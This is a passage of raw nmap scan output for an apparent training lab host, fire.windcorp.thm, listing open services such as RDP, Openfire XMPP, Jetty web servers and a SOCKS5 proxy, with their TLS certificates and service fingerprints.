| SHA-1: 37f4:e667:cef7:5cc4:47c9:d201:25cf:2b7d:20b2:c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-08-09T06:12:32+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server       syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2024-08-09T06:12:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-08T05:25:47
| Not valid after:  2025-02-07T05:25:47
| MD5:   c10c:c8c1:4286:b39e:6871:7b2e:e583:14ce
| SHA-1: 01f2:ebd2:5871:cc2a:f9ad:43f9:4f31:31a6:9e55:2386
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQclgj5w/akL9J3EmUk9Q3ajANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yNDA4MDgwNTI1NDdaFw0y
| NTAyMDcwNTI1NDdaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyBC/R6fLbVBInE+TcBsu78o5DTEW
| QqEqoDVFiIg96CbKqWcC2BiNsuTNPhD7SCCWC2H2hP4G/veZVycbDANgWcqQBhSc
| uBKFrdZeB9+ZU7p1yftePqLiulYW9gj6s7qpAjTerXTydSmK6PAMw6nU1AAfIPMW
| 3VB2T653zBnvq8TxkDgETVLem45km9l82/49t01c3KCS3/tasvWM5l2VmurZtAYs
| EpDzPmVyN3nhJGdo9YOLnMWOHOvaowHpIs27hL8l98AreIQRSvhpb5YUhtwySePO
| MgHBB3JsWNIGFVNS3rKkme6TkR95WkO/NfNuOs57DObwedlvMFgaXyG7TQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAHUSCwHajwf/mBWslxBccg1ll7IK/GHT/RwtB0PbtlGGAP5JFg7J
| At7HX5fUBpwPuqI2rChmFX7Mn6h/BYTs4lIIImEVm0wnWZ0XbFZ2cvKyY9XFL6zv
| Ug0uDlYhOZiVP+cXKlKq0tyUeCEvpQ5UHazaO2q7F15PAC9EQO4igIwXwrM8R1E3
| 4WLJJogeumGOMo7QeqtNLo+zh6ehL5vbWcOfZLr4y2Xqf+h7+OSpb93xvdOLaNrj
| voLnpTDClJNrU2Cn6fpJZtYPUMBLRyrZ/CIeLLEg59DNFhK9XmUnBe164Egmn5hT
| 48Bm5EqBenY/0+Zhyg1521M3kE2iLdqVnIM=
|_-----END CERTIFICATE-----
5222/tcp open  jabber              syn-ack ttl 125 Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: 2024-08-09T06:12:34+00:00; 0s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     stream_id: 625tmrabiv
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|_    features: 
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
5223/tcp open  ssl/jabber          syn-ack ttl 125 Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     xmpp: 
|     capabilities: 
|_    features: 
|_ssl-date: 2024-08-09T06:12:31+00:00; 0s from scanner time.
5229/tcp open  jaxflow?            syn-ack ttl 125
5269/tcp open  xmpp                syn-ack ttl 125 Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     xmpp: 
|     capabilities: 
|_    features: 
5270/tcp open  ssl/xmpp            syn-ack ttl 125 Wildfire XMPP Client
|_ssl-date: 2024-08-09T06:12:32+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
7070/tcp open  http                syn-ack ttl 125 Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
7443/tcp open  ssl/http            syn-ack ttl 125 Jetty 9.4.18.v20190429
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: HEAD
7777/tcp open  socks5              syn-ack ttl 125 (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open  zeus-admin?         syn-ack ttl 125
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 09 Aug 2024 06:10:21 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 09 Aug 2024 06:10:31 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail? syn-ack ttl 125
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 09 Aug 2024 06:10:46 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 09 Aug 2024 06:10:48 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
9389/tcp open  mc-nmf              syn-ack ttl 125 .NET Message Framing
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.94SVN%I=7%D=8/9%Time=66B5B2CD%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2009\x20Aug\x2
SF:02024\x2006:10:21\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020
SF:\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20
SF:bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<
SF:meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head
SF:>\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ill
SF:egal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso
SF:-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad
SF:\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0
SF:</pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20C
SF:NTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Len
SF:gth:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1
SF:><pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das
SF:,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Ille
SF:gal\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\
SF:x20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\
SF:nContent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Messag
SF:e\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1
SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20charact
SF:er\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTT
SF:POptions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2009\x20Aug\x2020
SF:24\x2006:10:31\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.94SVN%T=SSL%I=7%D=8/9%Time=66B5B2E6%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2009\x20
SF:Aug\x202024\x2006:10:46\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x
SF:202020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
SF:s:\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></tit
SF:le>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n
SF:</head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x20
SF:200\x20OK\r\nDate:\x20Fri,\x2009\x20Aug\x202024\x2006:10:48\x20GMT\r\nA
SF:llow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x2
SF:0400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x2
SF:0Message\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCChe
SF:ck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nConten
SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nCon
SF:nection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20
SF:Illegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"H
SF:TTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x2
SF:0text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x
SF:20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x2
SF:0character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-T
SF:ype:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnec
SF:tion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\
SF:x20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20chara
SF:cter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
